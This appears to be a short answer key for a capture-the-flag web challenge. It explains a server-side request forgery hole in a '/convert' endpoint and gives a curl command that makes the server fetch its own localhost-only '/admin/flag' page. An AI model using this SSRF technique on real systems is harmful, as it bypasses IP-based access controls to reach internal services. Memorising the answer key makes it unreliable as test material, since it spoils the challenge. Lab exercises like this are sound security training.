# EXACT SOLUTION — FOLLOW THESE STEPS IN ORDER

Vulnerability: SSRF bypassing an IP-based access control on an internal admin
page. `/convert` fetches any attacker-supplied `url` server-side, so pointing it
at the app's own loopback reaches the `127.0.0.1`-restricted `/admin/flag`.

1. **SSRF the server into fetching its own localhost admin flag endpoint:**

   ```
   curl -s -X POST http://<target>/convert -d "url=http://127.0.0.1:80/admin/flag"
   ```

2. **Extract the flag** (`FLAG{...}`) from the fetched content in the response and
   report it verbatim.
